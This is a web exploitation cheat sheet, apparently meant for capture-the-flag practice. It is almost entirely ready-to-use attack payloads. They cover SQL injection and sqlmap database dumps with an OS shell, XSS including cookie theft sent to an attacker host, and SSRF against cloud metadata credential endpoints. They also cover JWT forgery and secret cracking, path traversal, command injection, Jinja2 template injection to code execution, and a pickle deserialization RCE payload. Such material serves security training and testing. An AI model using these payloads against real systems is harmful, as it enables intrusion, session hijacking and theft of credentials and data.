# web exploitation cheatsheet

## first steps
```bash
# Recon
curl -v http://target/                       # headers, server info
curl -s http://target/robots.txt             # hidden paths
curl -s http://target/sitemap.xml            # more paths
# View source: Ctrl+U in browser
# Check cookies, JS files, comments in HTML
```

---

## sql injection

### detection
```
' OR 1=1 --
' OR '1'='1
" OR 1=1 --
1' AND 1=1 --          (true -> page normal)
1' AND 1=2 --          (false -> page different = SQLi!)
```

### union sqli
```sql
-- Find number of columns:
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --         (increase until error -> N-1 columns)

-- UNION extract:
' UNION SELECT 1,2,3 --
' UNION SELECT null,null,null --

-- Database info:
' UNION SELECT version(),user(),database() --

-- List tables:
' UNION SELECT table_name,null,null FROM information_schema.tables WHERE table_schema=database() --

-- List columns:
' UNION SELECT column_name,null,null FROM information_schema.columns WHERE table_name='users' --

-- Extract data:
' UNION SELECT username,password,null FROM users --
```

### blind sqli (boolean)
```sql
-- True/False responses:
' AND (SELECT LENGTH(database()))=5 --      (test DB name length)
' AND (SELECT SUBSTRING(database(),1,1))='a' --  (test first char)

-- Extract char by char with binary search
```

### blind sqli (time)
```sql
' AND SLEEP(5) --                           (if 5s delay -> vulnerable)
' AND IF(1=1,SLEEP(5),0) --
' AND IF((SELECT LENGTH(database()))=5,SLEEP(5),0) --
```

### sqlmap
```bash
sqlmap -u "http://target/page?id=1" --dbs           # list databases
sqlmap -u "http://target/page?id=1" -D dbname --tables  # list tables
sqlmap -u "http://target/page?id=1" -D dbname -T users --dump  # dump table
sqlmap -u "http://target/page?id=1" --os-shell       # OS shell (if possible)

# POST request:
sqlmap -u "http://target/login" --data="user=admin&pass=x" -p pass

# With cookie:
sqlmap -u "http://target/page?id=1" --cookie="session=abc123"
```

### sqlite
```sql
-- Tables (no information_schema):
' UNION SELECT name,sql,null FROM sqlite_master --
-- SQLite version:
' UNION SELECT sqlite_version(),null,null --
```

---

## xss

### reflected xss
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
"><script>alert(1)</script>
'><script>alert(1)</script>
javascript:alert(1)
```

### cookie stealing
```html
<script>fetch('https://attacker.com/?c='+document.cookie)</script>
<img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">
```

### filter bypass
```html
<ScRiPt>alert(1)</ScRiPt>                   <!-- case variation -->
<script>alert`1`</script>                    <!-- template literal -->
<img src=x onerror="eval(atob('YWxlcnQoMSk='))">  <!-- base64 -->
<svg/onload=alert(1)>                        <!-- no space needed -->
```

---

## ssrf

### common payloads
```
http://127.0.0.1/
http://localhost/
http://0.0.0.0/
http://[::1]/                                # IPv6 localhost
http://0x7f000001/                           # hex IP
http://2130706433/                           # decimal IP
http://127.0.0.1:8080/admin                  # internal admin panel
```

### cloud metadata
```
# AWS
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# GCP
http://metadata.google.internal/computeMetadata/v1/

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
```

### file read via ssrf
```
file:///etc/passwd
file:///flag.txt
file:///proc/self/environ
```

---

## jwt

### decode jwt
```bash
# JWT = header.payload.signature (base64url encoded)
echo "eyJhbGci..." | cut -d'.' -f1 | base64 -d 2>/dev/null
echo "eyJhbGci..." | cut -d'.' -f2 | base64 -d 2>/dev/null

# Online: https://jwt.io/
```

### jwt attacks

#### alg: none
```python
import base64, json

# Change algorithm to "none" -> signature not verified
header = {"alg": "none", "typ": "JWT"}
payload = {"user": "admin", "role": "admin"}

h = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=')
p = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=')
token = h + b'.' + p + b'.'
print(token.decode())
```

#### HS256 with known/weak secret
```bash
# Crack JWT secret:
# https://github.com/brendan-rius/c-jwt-cracker
./jwtcrack eyJhbGci...

# hashcat:
hashcat -m 16500 jwt.txt rockyou.txt

# john:
john jwt.txt --wordlist=rockyou.txt --format=HMAC-SHA256
```

#### RS256 -> HS256 confusion
```python
# If server accepts HS256 when it expects RS256:
# Sign with the public key as the HMAC secret
import jwt
public_key = open('public.pem').read()
token = jwt.encode({"user": "admin"}, public_key, algorithm="HS256")
```

### jwt_tool
```bash
# https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py <JWT>                    # decode
python3 jwt_tool.py <JWT> -T                 # tamper (interactive)
python3 jwt_tool.py <JWT> -X a               # alg:none attack
python3 jwt_tool.py <JWT> -X k -pk public.pem # key confusion
python3 jwt_tool.py <JWT> -C -d rockyou.txt  # crack secret
```

---

## other web attacks

### path traversal / lfi
```
../../../etc/passwd
....//....//....//etc/passwd                 # double encoding
..%2f..%2f..%2fetc%2fpasswd                  # URL encoded
/etc/passwd%00.php                           # null byte (old PHP)
php://filter/convert.base64-encode/resource=index.php  # PHP source read
```

### command injection
```bash
; cat /flag.txt
| cat /flag.txt
`cat /flag.txt`
$(cat /flag.txt)
; cat /flag.txt #
```

### ssti
```
# Detection:
{{7*7}}                  -> 49 = Jinja2/Twig
${7*7}                   -> 49 = Freemarker/Velocity
<%= 7*7 %>               -> 49 = ERB (Ruby)

# Jinja2 RCE:
{{config}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()}}
```

### deserialization
```python
# Python pickle RCE:
import pickle, os, base64
class Exploit:
    def __reduce__(self):
        return (os.system, ('cat /flag.txt',))
payload = base64.b64encode(pickle.dumps(Exploit()))

# PHP deserialization: look for unserialize() with user input
# Java deserialization: ysoserial
```

---

## tools
| Tool | What | Command/URL |
|------|------|------------|
| **Burp Suite** | HTTP proxy/interceptor | GUI |
| **curl** | HTTP requests | `curl -v http://target/` |
| **sqlmap** | Auto SQLi | `sqlmap -u "url?id=1" --dbs` |
| **dirsearch** | Directory brute | `dirsearch -u http://target/` |
| **gobuster** | Directory/DNS brute | `gobuster dir -u http://target/ -w wordlist.txt` |
| **ffuf** | Fuzzer | `ffuf -u http://target/FUZZ -w wordlist.txt` |
| **jwt_tool** | JWT attacks | https://github.com/ticarpi/jwt_tool |
| **CyberChef** | Decode | https://gchq.github.io/CyberChef/ |
| **Postman** | API testing | GUI |
